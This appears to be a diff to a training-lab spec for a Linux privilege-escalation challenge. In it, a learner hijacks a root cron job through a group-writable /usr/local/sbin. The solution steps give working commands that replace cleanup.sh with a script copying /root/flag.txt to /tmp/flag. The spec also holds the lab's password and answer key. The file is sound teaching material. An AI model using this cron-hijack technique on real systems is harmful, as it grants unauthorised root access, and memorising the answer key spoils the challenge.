@@ -12,11 +12,12 @@ spec:
   track: linux-networking
   type: challenge
   summary: >-
-    The admins of this box run a housekeeping script from root's crontab
-    every minute, and they made the ops group owners of /usr/local/sbin so
-    the team could manage such scripts without calling root. The learner
-    account sits in that group. You will spot the writable directory and
-    the scheduled job, replace the script with one that copies the root
+    The admins of this box run a root-owned housekeeping script from a
+    job in system cron under /etc/cron.d every minute, and they made
+    the learners group owners of /usr/local/sbin so the team could
+    manage such scripts without calling root. The learner account sits
+    in that group. You will spot the writable directory and the
+    scheduled job, replace the script with one that copies the root
     flag somewhere you can read it, and wait for cron to do the rest.
   objectives:
     - 'Find world- or group-writable locations with find and check group membership with id.'
@@ -51,7 +52,7 @@ spec:
     - id: cron-hijack
       title: 'Replace the cleanup script cron runs as root'
       prompt: >-
-        Log in with the account from the banner and work out what runs
+        Log in as learner with password learner and work out what runs
         periodically as root. The housekeeping script under
         /usr/local/sbin lives in a directory your group can write to.
         Replace it with commands that copy /root/flag.txt to /tmp/flag
@@ -74,10 +75,9 @@ spec:
         3. `cat /etc/cron.d/cleanup-job`: root executes
            /usr/local/sbin/cleanup.sh every minute.
         4. Replace the script through the writable directory:
-           `rm -f /usr/local/sbin/cleanup.sh` then create a new file:
-           printf '#!/bin/sh\ncp /root/flag.txt /tmp/flag\nchmod 644 /tmp/flag\n'
-             > /usr/local/sbin/cleanup.sh
-           and `chmod 755 /usr/local/sbin/cleanup.sh`.
+           `rm -f /usr/local/sbin/cleanup.sh`, then create your own with
+           `printf '%s\n' '#!/bin/sh' 'cp /root/flag.txt /tmp/flag' 'chmod 644 /tmp/flag' > /usr/local/sbin/cleanup.sh`
+           and make it executable with `chmod 755 /usr/local/sbin/cleanup.sh`.
         5. Wait up to ~65 seconds for the next cron tick, then
            `cat /tmp/flag`. It contains FLAG{...}. Submit the value.
       validator:
